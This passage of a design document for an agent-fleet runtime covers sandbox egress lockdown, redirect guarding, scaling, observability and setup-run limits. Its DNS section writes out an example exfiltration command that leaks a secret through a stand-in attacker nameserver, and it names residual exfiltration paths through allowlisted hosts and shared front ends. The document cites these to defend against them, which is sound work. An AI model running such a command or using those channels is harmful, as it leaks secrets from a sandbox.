**Name resolution is supervisor-provided, with no reachable resolver.** The supervisor renders a static `/etc/hosts` with each allowlist name and its resolved address.

The supervisor also renders an `/etc/resolv.conf` naming no server. Both are bound read-only into the sandbox. nf_tables drops **all** sandbox egress to port 53, so no forwarding resolver is reachable.

That closes the DNS-tunnel exfiltration channel (`dig $secret.attacker-ns.com @resolver`) by the *absence* of any resolver. An undeclared host misses `/etc/hosts` and fails **fast at resolution**, with no 30-second hang.

**Fail-closed and IPv4 only.** Four faults each refuse the run, and the refusal names its reason. The faults are an unresolved name, a name that resolves to IPv6 alone, a set over 256 addresses and any netlink failure.

A host from the fleet's `network.allow` that resolves to any address `af_core::net::is_blocked` refuses also refuses the run. Those addresses are loopback, the private ranges and the tailnet's shared range `100.64.0.0/10`. They also include link-local with the cloud metadata service `169.254.169.254`, and everything reserved.

That is the predicate `http_request` and the daemon's endpoint check use. A host refused at the request layer is therefore refused at the kernel too. The run ends with "the fleet allows an egress host at a private or reserved address", which the fleet owner fixes.

The log names the host, never the address. Registry hosts are exempt, because the operator may point them at a mirror on its own network.

IPv6 egress is out of scope.

A scope that fails to build is torn down with its sandbox, and the run is refused. The sandbox starts in a namespace holding only loopback. `prepare` returns it only after `join` builds its scope, so no tool call reaches it before its rules exist (`afr_sandbox`'s bubblewrap engine).

**Lifecycle.** The scope is built with the sandbox, before the run runs, and removed with it. A held sandbox is reused only when the runner's egress, its policy and its resolved set, is unchanged ([`runner_execution.md`](./runner_execution.md) §"Workspace between runs"). Building the engine sweeps every `afegress*` table and `afv*` link a crashed run left, before the first run.

**The probe.** At boot the runner builds one scope and tears it down, and reads `net.ipv4.ip_forward`.

Only success reports `egress_enforcement: true`. Otherwise the daemon reads an `allow_list_egress` runner degraded with `REASON_EGRESS_ENFORCEMENT_UNAVAILABLE` and runs it nothing (`afd_runner`'s reconcile module).

The host needs nf_tables in its kernel, `net.ipv4.ip_forward=1`, which the runner playbook sets, and no host firewall whose forward policy drops. A drop in any table's forward chain is final.

> **The allowlist versus the deferred name layer.** The above is a resolve-at-bind address pin. It has an own namespace, a host-side nf_tables allowlist, no proxy and no resolver in the data path.

> The name layer arrives when the fleet opens to untrusted or customer-operated runners. Those runners have **rotating-CDN host sets** that a pin at bind cannot track. The name layer is added the **modern** way, as an **eBPF/FQDN-aware datapath**.

> That datapath learns allowed addresses by snooping DNS *answers* and programs the same kernel set live.

> The model is the Cilium `toFQDNs` pattern, or a minimal DNS-answer watcher updating our existing set. There is **no forward proxy, no SNI/`CONNECT` interception and no TLS man-in-the-middle**.

> That squid-era approach is explicitly *not* the direction. It evolves the datapath from pin at bind to pin from observed DNS, same set.

> Introducing a controlled resolver to snoop is itself the change from the resolver-less posture, gated to that tier. A standing residual holds at every tier.

> An allow-listed write-capable host (for example `github.com`) is still an exfiltration channel by design. Only short-lived, scoped tokens close it, a credential-model change, not this layer.

> **Second residual: shared front ends.** The kernel set matches destination addresses alone. The default registry hosts sit on front ends shared with other sites.

> A sandbox can reach any of those sites by naming it in Server Name Indication (SNI). A hard boundary needs `registry_allowlist` pointed at a mirror on addresses the operator owns.

### HTTP destination settings

The reviewed Definition and run carry `network.http_egress`, `package_manager_domains` and `allow`. Restricted mode, the default, permits the additional exact domains plus the standard package registries when their preset is enabled.

Public mode permits public HTTPS destinations through HTTP tools. Both modes retain private/reserved address refusal, credential binding, repository/path restrictions and read-only rules.

Every connection checks all returned addresses, including mixed public/private answers. Redirects repeat admission before connecting.

`http_egress` and `package_manager_domains` do not enlarge sandbox network access or change the runner's assigned policy.
Existing `allow` entries can extend sandbox destinations when `read_only` is `false`, within that policy.
Dedicated UI controls remain future work.

### Guarded tool downloads

`http_request` follows 301, 302, 303, 307 and 308 only for a bodyless GET.

The shared HTTP builder still disables automatic redirects. The tool composes continuations through the same run's admission before each send (`afr_tools`' egress module and `af_egress`'s redirect module).

HTTPS, reviewed destination scope, address and origin request rules remain authoritative at every hop.

The guarded resolver checks every returned address at connection time.

A call follows at most three redirects within one 30-second deadline, including admission and credential minting. Each connect retains a 10-second ceiling within that deadline.

The pooled tool client disables implicit retries; inference retains its own policy. Intermediate response bodies are dropped unread. The final body retains the 1-MiB capture cap.

The model receives truncation and lossy-decoding notices before any body text. A known-truncated body is omitted from the model response rather than spending context on an unusable prefix. Complete bodies keep their existing text.

One bounded Location is resolved relative to the current URL. Both raw and resolved values pass an 8-KiB `garde` bound before their respective parsing or admission. Loop identity is the pinned URL library's serialized absolute URL with its fragment removed; a repeated identity stops before admission or send.

Missing, duplicate, malformed or oversized targets stop safely.

At the first origin change, including effective port, the chain permanently drops all modeled headers. Later hops cannot restore them or mint another credential. The run guard covers admission and minting, then releases before every transport wait.

Private targets have no raw Debug or serialized projection. The model sees only a safe origin on a redirect refusal. Final response text and content type mask the finite known target spellings, including credential-like query values (`af_egress`'s redirect privacy module).

Unknown secrets and arbitrary repeated encodings are outside that detection claim. Redirect outcome records carry bounded status, counts and reasons; see [observability](./observability.md).

## Scaling

The split inverts the binding constraint. The pre-cutover runtime needed N datastore connections for N fleets, and the pool ceiling was the wall. After the split, runners hold zero datastore connections, and the bottleneck becomes `agentsfleetd` API replicas plus Postgres writes, both of which scale horizontally.

Runners scale out with no coordination. The operator enrolls a host with a pre-minted `agt_r`, and it pulls.

The one piece needing care at multi-replica scale is placement (assignment and scheduling). Placement is the concern of M84_002 (reassignment, shipped) and M85_001 (label placement, shipped).

The hot path (run and report) is shardable. See [`scaling.md`](./scaling.md) for the re-derived connection math.

## Observability: bounded facts to `agentsfleetd`; logs, traces and metrics to a runner collector

The fleet is observed **without any inbound reach into runners**. A runner may sit behind Network Address Translation (NAT), on an untrusted host, or on a customer host. A scraper cannot reliably reach those machines.

Bounded per-runner facts therefore ride outbound on verbs the runner already calls: `report`, `heartbeat`, and run grant and release. `agentsfleetd` accumulates those facts and **pushes** them, with everything else it measures, over OpenTelemetry Protocol (OTLP) to one configured endpoint. There is no scrape target and no pull endpoint; the daemon exports, nothing collects from it.

The per-runner drill-down is a `runner_id` label.

The fleet delivery histogram records `event_to_assign`, `assign_to_first_chunk`, `event_to_first_chunk`, and `run_to_first_chunk` stages. A first chunk can carry reasoning or tool protocol; these are transport timings through daemon receipt, not browser paint.

The chat UI records local `agentsfleet.chat.submit_to_first_visible` Performance Timeline measures after the first answer, reasoning, or tool activity paints. That browser measure is currently available for local diagnostics and is not exported to OTLP or the Grafana panel.

Logs, spans and runner families: [observability.md](./observability.md) §"Signal routing".

### The four per-runner families

The four are `agentsfleet_runner_failures_total`, `…_runs_total`, `…_last_seen_seconds` and `…_active_runs`, each labelled by `runner_id`. `…_runs_total` carries `outcome` as `acquired`, `succeeded`, `failed` or `expired`. Alongside them, and deliberately **not** in the per-runner table, are the global unlabelled families that describe the control plane's own discovery cost. Families, labels and types: [`rustd/crates/protocol/af_observability/src/metrics/census.tsv`](../../rustd/crates/protocol/af_observability/src/metrics/census.tsv).

The discovery counters describe gateway assign attempts without entity labels.
The historical `run_polls_total` name counts these attempts; it does not imply runner run polling.
Statement cost comes from `pg_stat_statements` in `make bench-runs`.

The fleet census publishes the unsettled turn count and oldest age (`agentsfleet_turn_backlog`, `agentsfleet_turn_backlog_oldest_age_seconds`).
Use the maximum across replicas, since each census reads the deployment-wide ledger.
A failed census withdraws both gauges rather than exporting an old value.

The four per-runner families live in a fixed-capacity (4096-series) table keyed on `runner_id`, held by the daemon in `af_observability`. A lookup takes a read lock, and the counters underneath it are atomics, so recording never blocks another recorder.

The OTLP export reads only that in-memory snapshot, **zero Postgres on the export path**. The export therefore stays healthy exactly when the database is not.

Cardinality is capped: the 4097th distinct `runner_id` routes to `runner_id="_other"` (counters preserved). Footprint is therefore bounded by that cap regardless of fleet size or uptime. A `agentsfleetd` restart zeroes the table; Prometheus counter-reset semantics absorb it, and gauges self-heal within one heartbeat or run cycle.

### Multi-replica (`agentsfleetd` N>1): correctness is an *aggregation* property

Prod is sized for **3 `agentsfleetd` machines**. The release workflow sets that count with `flyctl scale` and verifies that all three machines are running before public readiness. The sections below are written for N>1 as the operating shape, not the contingency.

A runner's verbs load-balance across replicas. So each replica holds only the slice of that runner's verb stream it served. Each replica exports its own series.

The series are identified by the OpenTelemetry resource attribute carrying the machine identity, not by a scrape target's `instance` label. Fleet-wide truth is so reconstructed by the query, not by shared state:

| Series | Cross-replica query | Exact under N>1? |
|--------|---------------------|------------------|
| `failures_total`, `runs_total` | `sum by (runner_id, …)` | ✅ exact. Counters are additive; per-replica slices are disjoint |
| `last_seen_seconds` | `min by (runner_id)` | ✅ exact. The most-recent sighting wins; a replica that never saw the runner exposes no series, so `min` ignores it |
| `active_runs` | `sum by (runner_id)` | ⚠️ approximate. The `+1` grant and `−1` release can land on different replicas, so the value is meaningful only in aggregate and a single-replica restart can transiently skew it |

`active_runs` is the one series that cannot be made exact purely in-memory. It is a distributed inc/dec with no routing affinity and no shared counter. Its exact source is the durable run table (`thread.runs`, `run_expires_at` plus the held set), which the **deferred metrics refresher** below reads.

The cross-replica queries in the table above are the operator's responsibility to apply. This repository ships no dashboards, and any dashboard that graphs `active_runs` must label the panel best-effort under N>1.

### The deferred refresher: exact gauges without metrics-in-the-DB

The exact, restart-resilient form of the two gauges is a read-only background thread per replica. On a timer of about 15 s it queries Postgres for `last_seen_at` and the live run count (`count(*) WHERE run_expires_at > now()`).

It overwrites an in-memory snapshot and lets the OTLP export read that snapshot. This keeps the export path DB-free while giving every replica identical, exact values and closing the abandoned-run over-count.

It is **not "metrics in Postgres"**. It *reads* already-durable operational state to derive a gauge; the timeseries still lives only in the metrics backend. Deferred; it is the durable answer for a scaled-out future.

## Setup runs

A setup run answers one message of a creator-private draft. It is a run on the common run path, owned by the draft instead of a fleet.

Setup work shares runner capacity with fleet runs. Verification evidence belongs in the [check ledger](../reviews/workspace-setup/checks.md).

The native connection declares `accepted_kinds`: `fleet` alone, or `fleet` and `setup` (`af_wire::run::AcceptedKinds`). Every run arrives as a `Down::Run`. A setup run's payload names the draft as its `owner` and carries the setup part: the head candidate, its revision, the message's sequence, `save_requested` and the `propose_setup` tool (`af_wire::run::SetupWork`).

An assignment locks the runner row, counts live runs across both kinds plus valid sandbox holds, and inserts within that transaction.

Reusing the assigned fleet's hold transfers its worker once; setup charges every hold.

Renewal counts live work without charging idle holds again.

The local keeper counts fleet and setup work together and retires oldest holds to preserve one free worker.
`afd_runner/src/capacity` and `afr_supervisor/src/holds` own the server and host checks.

The server owns `worker_count`; the connection cannot override it. Reducing it below current occupancy stops new assignments and refuses renewals until occupancy fits (`afd_runner`'s capacity module). Existing runs can therefore be interrupted.

The shared poll reads an optimistic kind choice. Under the host lock, each successful placement rechecks and advances the assignment revision and last successful kind. Mixed placements alternate preference across daemon replicas; an empty kind tries the other, and a competing placement invalidates the old choice.

Both renewal kinds take the runner row before extending a live deadline, then the run's thread and row. A setup renewal never takes a draft row. [Concurrency](concurrency.md#runner-capacity-and-setup-lock-order) owns the ordering and the assignment's `NOWAIT` exception.

Renewals sample database time after acquiring the host guard. Expired work requires a new capacity-checked assignment; renewal cannot revive it. Runtime renewal extends the run and thread deadlines atomically under their original fences.

Setup is creator-private work. The assignment resolves the workspace owner and rechecks the creator's membership. It chooses the oldest eligible queued message within the draft, and refuses a second live run for the same draft.

Selection across kinds must avoid starvation with a bounded alternating eligible-kind choice; an empty kind never blocks the other. Setup messages remain a Postgres queue in `thread.turns`; NATS carries wake and progress hints, not another authoritative copy.

The `setup` schema defines creator-private `setup.drafts`, candidates and replay receipts. A draft's chat inputs are its `thread.turns` rows, and a setup run is a `thread.runs` row its draft owns.

A setup run's charges are its usage lines in `billing.usage_lines`, with `work_type = 'setup_run'` and the run as their work. They are retained independently of the chat (billing §11). Immutable native setup revisions join their existing domains.

The private progress channel is the draft's thread, `af.thread.{draft_id}.items`.
The publisher and HTTP reader recheck current access before sending answer previews.
No private frame joins workspace broadcast; durable turn reads remain authoritative.

Each setup run has a run identity, a fence, an expiry, a pinned model and its key, and a funds bound. Renewal and report check the run and its fence. No runtime credential mint, tenant tools, memory, repository checkout, schedule access, or fleet message capability is issued to this run. It builds no sandbox.

Instructions and native setup are untrusted context, never system authority.

### Model calls

The runner makes every model call, in one guffbolt loop whose only tool is `propose_setup` (`afr_agent`'s setup module). The daemon makes none.

The assignment opens the pinned model's key and carries it in the run payload. A tenant runner is never assigned a setup run on the platform model. [`AUTH.md`](../AUTH.md#fleet-setup-and-credential-boundary) owns that boundary.

The [shared chat explanation](shared_chat_verification.md#backend-ownership) maps these methods and their callers.

### Token and time bounds

| Bound | Value | Enforcement |
|---|---|---|
| Input per model call | Selected model's physical window | guffbolt's window hook compacts the oldest turns when the window fills. |
| Wall time per run | 300 seconds | `afd_setup::limits::SETUP_RUNTIME`, the run's `max_runtime_seconds`. The proposal loop has no other cap. |
| Funds bound | 300 seconds of runtime, plus output for 8 calls on the platform's key | `afd_setup::limits::MODEL_CALLS_MAX`; the assignment's gate checks it, and sets nothing aside. |
| Runs per message | `af_core::limits::EVENT_RUNS_MAX` (3) | A lapsed run is reassigned at the next fence and reruns the message from the start. Past the limit, the message fails. |
| Instructions | 1,048,576 characters | The one text ceiling, `af_validate::TEXT_MAX_CHARS`, independently of tokenizer counts. |
| Proposal in a report | 6,553,600 bytes | `af_validate::DEFINITION_MAX_BYTES`, the bound the Definition parser applies. |
| Answer preview chunk | 4 KiB | `afd_setup`'s `setup_run/progress.rs`. |

Original history remains creator-private and is read in bounded pages. [Conversation compaction](context_lifecycle.md) retains working notes without a fixed 64-message or 32,768-token conversation allowance.

The `o200k_base` estimate for an unrecognized model carries a quarter of headroom, so it can refuse input that the provider's tokenizer would fit. Provider-reported usage remains authoritative for settlement, including charged reasoning tokens.

The model has one proposal tool: initialize once when no candidate exists, then small edits against the candidate ID and revision. `af_fleet_runtime::setup` decides each proposal. A refused proposal goes back to the model as the tool result, and the run goes on. The report carries the last proposal the run kept.

The daemon applies `Definition::parse` and the base check again in the report transaction. Only then does it write the next candidate revision. A proposal it refuses writes no candidate, and the message keeps its answer.

The model may ask clarifying questions. It cannot grant access, Save, call arbitrary functions, or choose different credentials. Tool operations pass the same validator as drawer edits.

### Private copies and report recovery

| Copy | Owner | Lifetime and removal |
|---|---|---|
| Draft turns and candidates | Creator-private setup domain | Draft deletion removes private rows and its runs. |
| The draft's compacted context | Setup domain, `memory.context_checkpoints` | Removed with the draft by foreign key. |
| Pending setup report | Supervisor worker | Retained only in memory. Process loss discards it. |
| Usage lines | Billing domain | Content-free; retained independently of the draft. |
| Provider logs and infrastructure snapshots | Their service owners | Follow their own retention; draft deletion cannot promise physical removal from these systems. |

A report is idempotent by run and fence. A replayed report finds the run settled and writes nothing. A report at a superseded fence is refused and writes nothing; the expiry sweep bills the dead run's last slice.
